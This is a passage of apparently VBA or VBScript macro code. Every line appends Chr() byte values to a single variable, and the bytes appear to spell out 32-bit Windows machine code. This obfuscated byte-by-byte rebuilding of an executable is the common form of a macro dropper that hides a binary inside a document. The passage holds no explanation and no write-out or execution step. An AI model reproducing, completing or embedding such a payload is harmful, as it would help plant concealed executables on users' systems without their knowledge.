GqnqCn=GqnqCn&Chr(192)&Chr(117)&Chr(15)&Chr(129)&Chr(255)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(87)&Chr(232)&Chr(162)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(87)&Chr(0)&Chr(0)&Chr(0)&Chr(106)&Chr(12)&Chr(232)&Chr(115)&Chr(6)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(126)&Chr(108)&Chr(133)&Chr(255)&Chr(116)&Chr(35)&Chr(87)&Chr(232)&Chr(35)&Chr(32)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(61)&Chr(232)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(20)&Chr(129)&Chr(255)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(116)&Chr(12)&Chr(131)&Chr(63)&Chr(0)&Chr(117)&Chr(7)&Chr(87)&Chr(232)&Chr(47)&Chr(30)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(86)
GqnqCn=GqnqCn&Chr(232)&Chr(74)&Chr(25)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(30)&Chr(2)&Chr(0)&Chr(0)&Chr(194)&Chr(4)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(13)&Chr(232)&Chr(66)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(117)&Chr(8)&Chr(106)&Chr(12)&Chr(232)&Chr(54)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(190)&Chr(148)&Chr(135)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(12)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(7)&Chr(86)&Chr(232)&Chr(240)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(15)&Chr(132)&Chr(94)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(20)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(224)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(255)&Chr(214)&Chr(104)&Chr(212)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(196)&Chr(176)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(255)&Chr(214)&Chr(104)&Chr(200)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(104)&Chr(192)&Chr(135)&Chr(64)&Chr(0)&Chr(87)&Chr(163)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(214)&Chr(131)&Chr(61)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(84)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(116)&Chr(22)&Chr(131)&Chr(61)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(13)&Chr(131)&Chr(61)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(4)&Chr(133)&Chr(192)&Chr(117)&Chr(36)&Chr(161)&Chr(76)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(161)&Chr(88)&Chr(128)&Chr(64)&Chr(0)&Chr(199)&Chr(5)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(215)&Chr(32)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(204)&Chr(176)&Chr(64)
GqnqCn=GqnqCn&Chr(0)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(80)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(20)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(15)&Chr(132)&Chr(204)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(53)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(34)&Chr(240)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(19)&Chr(251)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(3)&Chr(251)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(200)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(243)&Chr(250)&Chr(255)&Chr(255)&Chr(255)&Chr(53)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(163)&Chr(204)&Chr(176)
GqnqCn=GqnqCn&Chr(64)&Chr(0)&Chr(232)&Chr(227)&Chr(250)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(16)&Chr(163)&Chr(208)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(120)&Chr(3)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(101)&Chr(104)&Chr(203)&Chr(34)&Chr(64)&Chr(0)&Chr(255)&Chr(53)&Chr(196)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(61)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(163)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(255)&Chr(116)&Chr(72)&Chr(104)&Chr(20)&Chr(2)&Chr(0)&Chr(0)&Chr(106)&Chr(1)&Chr(232)&Chr(181)&Chr(24)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(89)&Chr(89)&Chr(133)&Chr(246)&Chr(116)&Chr(52)&Chr(86)&Chr(255)&Chr(53)&Chr(16)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(53)&Chr(204)&Chr(176)&Chr(64)&Chr(0)&Chr(232)&Chr(10)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(208)&Chr(133)&Chr(192)&Chr(116)&Chr(27)&Chr(106)&Chr(0)
GqnqCn=GqnqCn&Chr(86)&Chr(232)&Chr(231)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(78)&Chr(4)&Chr(255)&Chr(137)&Chr(6)&Chr(51)&Chr(192)&Chr(64)&Chr(235)&Chr(7)&Chr(232)&Chr(146)&Chr(251)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(95)&Chr(94)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(51)&Chr(192)&Chr(57)&Chr(69)&Chr(8)&Chr(106)&Chr(0)&Chr(15)&Chr(148)&Chr(192)&Chr(104)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(108)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(2)&Chr(93)&Chr(195)&Chr(51)&Chr(192)&Chr(64)&Chr(163)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(204)&Chr(104)&Chr(32)&Chr(38)&Chr(64)&Chr(0)&Chr(100)&Chr(255)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(36)&Chr(16)
GqnqCn=GqnqCn&Chr(137)&Chr(108)&Chr(36)&Chr(16)&Chr(141)&Chr(108)&Chr(36)&Chr(16)&Chr(43)&Chr(224)&Chr(83)&Chr(86)&Chr(87)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(49)&Chr(69)&Chr(252)&Chr(51)&Chr(197)&Chr(80)&Chr(137)&Chr(101)&Chr(232)&Chr(255)&Chr(117)&Chr(248)&Chr(139)&Chr(69)&Chr(252)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(248)&Chr(141)&Chr(69)&Chr(240)&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(139)&Chr(77)&Chr(240)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(95)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(81)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(83)&Chr(139)&Chr(93)&Chr(12)
GqnqCn=GqnqCn&Chr(86)&Chr(139)&Chr(115)&Chr(8)&Chr(51)&Chr(53)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(6)&Chr(198)&Chr(69)&Chr(255)&Chr(0)&Chr(199)&Chr(69)&Chr(244)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(123)&Chr(16)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(133)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(70)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(117)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(246)&Chr(64)&Chr(4)&Chr(102)&Chr(15)&Chr(133)&Chr(22)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(16)&Chr(141)&Chr(85)&Chr(232)&Chr(137)&Chr(83)&Chr(252)&Chr(139)&Chr(91)&Chr(12)&Chr(137)&Chr(69)&Chr(232)&Chr(137)&Chr(77)&Chr(236)&Chr(131)&Chr(251)&Chr(254)&Chr(116)&Chr(95)&Chr(141)&Chr(73)&Chr(0)
GqnqCn=GqnqCn&Chr(141)&Chr(4)&Chr(91)&Chr(139)&Chr(76)&Chr(134)&Chr(20)&Chr(141)&Chr(68)&Chr(134)&Chr(16)&Chr(137)&Chr(69)&Chr(240)&Chr(139)&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(133)&Chr(201)&Chr(116)&Chr(20)&Chr(139)&Chr(215)&Chr(232)&Chr(52)&Chr(42)&Chr(0)&Chr(0)&Chr(198)&Chr(69)&Chr(255)&Chr(1)&Chr(133)&Chr(192)&Chr(124)&Chr(64)&Chr(127)&Chr(71)&Chr(139)&Chr(69)&Chr(248)&Chr(139)&Chr(216)&Chr(131)&Chr(248)&Chr(254)&Chr(117)&Chr(206)&Chr(128)&Chr(125)&Chr(255)&Chr(0)&Chr(116)&Chr(36)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(2)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(86)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(58)&Chr(232)&Chr(242)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(244)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)
GqnqCn=GqnqCn&Chr(93)&Chr(195)&Chr(199)&Chr(69)&Chr(244)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(201)&Chr(139)&Chr(77)&Chr(8)&Chr(129)&Chr(57)&Chr(99)&Chr(115)&Chr(109)&Chr(224)&Chr(117)&Chr(41)&Chr(131)&Chr(61)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(32)&Chr(104)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(232)&Chr(195)&Chr(6)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(4)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(139)&Chr(85)&Chr(8)&Chr(106)&Chr(1)&Chr(82)&Chr(255)&Chr(21)&Chr(200)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(196)&Chr(8)&Chr(139)&Chr(77)&Chr(12)&Chr(232)&Chr(215)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(12)&Chr(57)&Chr(88)&Chr(12)&Chr(116)&Chr(18)&Chr(104)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(211)&Chr(139)&Chr(200)&Chr(232)&Chr(218)&Chr(41)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(12)&Chr(139)&Chr(77)&Chr(248)
GqnqCn=GqnqCn&Chr(137)&Chr(72)&Chr(12)&Chr(139)&Chr(6)&Chr(131)&Chr(248)&Chr(254)&Chr(116)&Chr(13)&Chr(139)&Chr(78)&Chr(4)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(56)&Chr(232)&Chr(111)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(78)&Chr(12)&Chr(139)&Chr(86)&Chr(8)&Chr(3)&Chr(207)&Chr(51)&Chr(12)&Chr(58)&Chr(232)&Chr(95)&Chr(40)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(72)&Chr(8)&Chr(139)&Chr(215)&Chr(232)&Chr(109)&Chr(41)&Chr(0)&Chr(0)&Chr(186)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(57)&Chr(83)&Chr(12)&Chr(15)&Chr(132)&Chr(82)&Chr(255)&Chr(255)&Chr(255)&Chr(104)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(87)&Chr(139)&Chr(203)&Chr(232)&Chr(133)&Chr(41)&Chr(0)&Chr(0)&Chr(233)&Chr(28)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(131)&Chr(101)&Chr(248)
GqnqCn=GqnqCn&Chr(0)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(83)&Chr(87)&Chr(191)&Chr(78)&Chr(230)&Chr(64)&Chr(187)&Chr(187)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(59)&Chr(199)&Chr(116)&Chr(13)&Chr(133)&Chr(195)&Chr(116)&Chr(9)&Chr(247)&Chr(208)&Chr(163)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(235)&Chr(96)&Chr(86)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(255)&Chr(21)&Chr(132)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(117)&Chr(252)&Chr(51)&Chr(117)&Chr(248)&Chr(255)&Chr(21)&Chr(128)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(255)&Chr(21)&Chr(100)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(255)&Chr(21)&Chr(124)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(240)&Chr(141)&Chr(69)&Chr(240)&Chr(80)&Chr(255)&Chr(21)&Chr(120)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(244)&Chr(51)&Chr(69)&Chr(240)&Chr(51)&Chr(240)&Chr(59)&Chr(247)&Chr(117)&Chr(7)&Chr(190)&Chr(79)&Chr(230)
GqnqCn=GqnqCn&Chr(64)&Chr(187)&Chr(235)&Chr(11)&Chr(133)&Chr(243)&Chr(117)&Chr(7)&Chr(139)&Chr(198)&Chr(193)&Chr(224)&Chr(16)&Chr(11)&Chr(240)&Chr(137)&Chr(53)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(247)&Chr(214)&Chr(137)&Chr(53)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(94)&Chr(95)&Chr(91)&Chr(201)&Chr(195)&Chr(106)&Chr(8)&Chr(104)&Chr(136)&Chr(147)&Chr(64)&Chr(0)&Chr(232)&Chr(106)&Chr(253)&Chr(255)&Chr(255)&Chr(232)&Chr(94)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(64)&Chr(120)&Chr(133)&Chr(192)&Chr(116)&Chr(22)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(255)&Chr(208)&Chr(235)&Chr(7)&Chr(51)&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(206)&Chr(40)&Chr(0)&Chr(0)&Chr(232)&Chr(131)&Chr(253)&Chr(255)&Chr(255)&Chr(195)&Chr(104)&Chr(66)&Chr(40)&Chr(64)&Chr(0)&Chr(232)&Chr(101)&Chr(247)&Chr(255)
GqnqCn=GqnqCn&Chr(255)&Chr(89)&Chr(163)&Chr(216)&Chr(176)&Chr(64)&Chr(0)&Chr(195)&Chr(139)&Chr(255)&Chr(86)&Chr(87)&Chr(51)&Chr(246)&Chr(191)&Chr(224)&Chr(176)&Chr(64)&Chr(0)&Chr(131)&Chr(60)&Chr(245)&Chr(36)&Chr(161)&Chr(64)&Chr(0)&Chr(1)&Chr(117)&Chr(30)&Chr(141)&Chr(4)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(137)&Chr(56)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(255)&Chr(48)&Chr(131)&Chr(199)&Chr(24)&Chr(232)&Chr(35)&Chr(8)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(12)&Chr(70)&Chr(131)&Chr(254)&Chr(36)&Chr(124)&Chr(210)&Chr(51)&Chr(192)&Chr(64)&Chr(95)&Chr(94)&Chr(195)&Chr(131)&Chr(36)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(241)&Chr(139)&Chr(255)&Chr(83)&Chr(139)&Chr(29)&Chr(72)&Chr(128)&Chr(64)&Chr(0)&Chr(86)&Chr(190)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(87)&Chr(139)
GqnqCn=GqnqCn&Chr(62)&Chr(133)&Chr(255)&Chr(116)&Chr(19)&Chr(131)&Chr(126)&Chr(4)&Chr(1)&Chr(116)&Chr(13)&Chr(87)&Chr(255)&Chr(211)&Chr(87)&Chr(232)&Chr(39)&Chr(20)&Chr(0)&Chr(0)&Chr(131)&Chr(38)&Chr(0)&Chr(89)&Chr(131)&Chr(198)&Chr(8)&Chr(129)&Chr(254)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(124)&Chr(220)&Chr(190)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(95)&Chr(139)&Chr(6)&Chr(133)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(126)&Chr(4)&Chr(1)&Chr(117)&Chr(3)&Chr(80)&Chr(255)&Chr(211)&Chr(131)&Chr(198)&Chr(8)&Chr(129)&Chr(254)&Chr(64)&Chr(162)&Chr(64)&Chr(0)&Chr(124)&Chr(230)&Chr(94)&Chr(91)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(255)&Chr(52)&Chr(197)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(136)&Chr(128)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(168)&Chr(147)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(232)&Chr(103)&Chr(252)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(71)&Chr(137)&Chr(125)&Chr(228)&Chr(51)&Chr(219)&Chr(57)&Chr(29)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(117)&Chr(24)&Chr(232)&Chr(129)&Chr(237)&Chr(255)&Chr(255)&Chr(106)&Chr(30)&Chr(232)&Chr(207)&Chr(235)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(17)&Chr(233)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(139)&Chr(117)&Chr(8)&Chr(141)&Chr(52)&Chr(245)&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(57)&Chr(30)&Chr(116)&Chr(4)&Chr(139)&Chr(199)&Chr(235)&Chr(110)&Chr(106)&Chr(24)&Chr(232)&Chr(31)&Chr(20)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(117)&Chr(15)&Chr(232)&Chr(60)&Chr(2)&Chr(0)&Chr(0)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(235)&Chr(81)&Chr(106)&Chr(10)&Chr(232)&Chr(89)&Chr(0)&Chr(0)&Chr(0)&Chr(89)
GqnqCn=GqnqCn&Chr(137)&Chr(93)&Chr(252)&Chr(57)&Chr(30)&Chr(117)&Chr(44)&Chr(104)&Chr(160)&Chr(15)&Chr(0)&Chr(0)&Chr(87)&Chr(232)&Chr(26)&Chr(7)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(23)&Chr(87)&Chr(232)&Chr(85)&Chr(19)&Chr(0)&Chr(0)&Chr(89)&Chr(232)&Chr(6)&Chr(2)&Chr(0)&Chr(0)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(228)&Chr(235)&Chr(11)&Chr(137)&Chr(62)&Chr(235)&Chr(7)&Chr(87)&Chr(232)&Chr(58)&Chr(19)&Chr(0)&Chr(0)&Chr(89)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(255)&Chr(251)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(10)&Chr(232)&Chr(40)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(86)&Chr(141)&Chr(52)&Chr(197)
GqnqCn=GqnqCn&Chr(32)&Chr(161)&Chr(64)&Chr(0)&Chr(131)&Chr(62)&Chr(0)&Chr(117)&Chr(19)&Chr(80)&Chr(232)&Chr(34)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(8)&Chr(106)&Chr(17)&Chr(232)&Chr(5)&Chr(232)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(54)&Chr(255)&Chr(21)&Chr(140)&Chr(128)&Chr(64)&Chr(0)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(163)&Chr(48)&Chr(178)&Chr(64)&Chr(0)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(131)&Chr(165)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(0)&Chr(83)&Chr(106)&Chr(76)&Chr(141)&Chr(133)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(80)&Chr(232)&Chr(249)&Chr(39)&Chr(0)&Chr(0)&Chr(141)
GqnqCn=GqnqCn&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(133)&Chr(44)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(133)&Chr(224)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(220)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(149)&Chr(216)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(157)&Chr(212)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(181)&Chr(208)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(189)&Chr(204)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(149)&Chr(248)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(141)&Chr(236)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(157)&Chr(200)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(133)&Chr(196)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(165)&Chr(192)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(173)
GqnqCn=GqnqCn&Chr(188)&Chr(253)&Chr(255)&Chr(255)&Chr(156)&Chr(143)&Chr(133)&Chr(240)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(4)&Chr(141)&Chr(77)&Chr(4)&Chr(199)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(137)&Chr(133)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(244)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(73)&Chr(252)&Chr(137)&Chr(141)&Chr(228)&Chr(253)&Chr(255)&Chr(255)&Chr(199)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(23)&Chr(4)&Chr(0)&Chr(192)&Chr(199)&Chr(133)&Chr(17)&Chr(252)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(133)&Chr(228)&Chr(252)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(156)&Chr(128)&Chr(64)&Chr(0)&Chr(106)&Chr(0)&Chr(139)&Chr(216)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(21)&Chr(152)
GqnqCn=GqnqCn&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(12)&Chr(133)&Chr(219)&Chr(117)&Chr(8)&Chr(106)&Chr(2)&Chr(232)&Chr(8)&Chr(39)&Chr(0)&Chr(0)&Chr(89)&Chr(104)&Chr(23)&Chr(4)&Chr(0)&Chr(192)&Chr(255)&Chr(21)&Chr(148)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(144)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(91)&Chr(232)&Chr(110)&Chr(36)&Chr(0)&Chr(0)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(255)&Chr(53)&Chr(48)&Chr(178)&Chr(64)&Chr(0)&Chr(232)&Chr(227)&Chr(244)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(3)&Chr(93)&Chr(255)&Chr(224)&Chr(106)&Chr(2)&Chr(232)&Chr(201)&Chr(38)&Chr(0)&Chr(0)&Chr(89)&Chr(93)&Chr(233)&Chr(178)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(51)&Chr(201)&Chr(59)&Chr(4)
